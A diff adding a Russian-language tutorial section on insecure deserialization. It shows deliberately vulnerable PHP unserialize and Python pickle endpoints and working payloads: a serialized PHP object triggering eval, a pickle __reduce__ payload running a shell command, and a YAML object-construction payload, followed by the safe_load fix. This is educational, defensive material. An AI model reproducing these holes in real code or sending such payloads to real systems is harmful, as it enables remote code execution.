@@ -175,7 +175,96 @@ dnsmasq:x: 102: 65534:dnsmasq,
 - удостовериться, что функция загрузки XML или XSL проверяет входящие файлы с использованием XSD или другой подобной методики;
 - анализировать код масштабных и сложных приложений со множеством встраиваемых компонентов вручную, хотя инструменты SAST могут помочь обнаружить XXE в исходном коде.
 
+#### Примеры атак на механизм сериализации
 
+**PHP**
+
+В примере ниже класс Injection реализует магический метод **__wakeup()**. Этот метод будет реализован после десериализации объекта класса внедрения, и, как показано, он выполнит код, хранящийся в переменной класса $some_data.
+
+```php
+<?php 
+    class Injection{
+        public $some_data;
+        function __wakeup(){
+            if(isset($this->some_data)){
+                eval($this->some_data);
+            }
+        }
+    }
+
+    if(isset($_REQUEST['data'])){
+        $result = unserialize($_REQUEST['data'])
+        // ...
+    }
+?>
+```
+
+С использованием сериализованной полезной нагрузкой, указанной ниже, мы получим вывод функции **phpinfo**:
+
+```html
+https://example.com/vulnerable.php?data=O:9:"Injection":1:{s:9:"some_data";s:10:"phpinfo();";} 
+```
+
+**Python**
+
+Здесь атака проводится через библиотеку pickle, которая предназначена для сериализации/десериализации объектов python.
+
+```python
+import pickle
+from flask import request
+
+@app.route('vulnerable.py', methods=['GET'])
+def parse_request():
+    data = request.request.args.get('data')
+    if (data):
+        pickle.loads(data)
+        # ...
+```
+
+Подготовим полезную нагрузку:
+
+```python
+import pickle
+
+
+class Payload(object):
+    def __reduce__(self):
+        return (exec, ('import os;os.system("ls")', ))
+
+
+pickle_data = pickle.dumps(Payload())
+print(pickle_data)
+```
+
+и выполним
+
+```
+https://example.com/vulnerable.py?data=%80%03cbuiltins%0Aexec%0Aq%00X%19%00%00%00import%20os%3Bos.system%28%22ls%22%29q%01%85q%02Rq%03.
+```
+
+**Yaml**
+
+Существует множество языков и фреймворков, которые обеспечивают удаленное выполнение кода в ходе десериализации YAML
+
+Например, выполнение аналогичного кода на Python приведет к выводу списка текущего каталога:
+
+```python
+import yaml
+
+yaml.load("!!python/object/new:os.system [ls -la]", Loader=yaml.UnsafeLoader)
+```
+
+Это довольно распространенная проблема для многих языков программирования.
+
+Как видно из приведенного выше кода, **Loader=yaml.UnsafeLoader** был передан явно при вызове функции yaml.load(). Это сделано для демонстрации, так как последние версии библиотеки по умолчанию не позволяют использовать уязвимые методы.
+
+Таким образом, попытка вызвать yaml.load() без дополнительных параметров приведет к появлению сообщения об ошибке:
+
+```
+main.py:3: YAMLLoadWarning: calling yaml.load() without Loader=... is deprecated, as the default Loader is unsafe. Please read https://msg.pyyaml.org/load for full details.
+```
+
+Однако в более ранних версиях функция yaml.load() не ограничивала выполнение управляющих структур. Следовательно, для безопасной десериализации ненадежного YAML надо использовать функцию yaml.safe_load(). Тем не менее, эта уязвимость еще есть во многих приложениях, которые используют более ранние версии библиотеки для работы с YAML.
 
 ### II. Разбор Java-проекта.
 
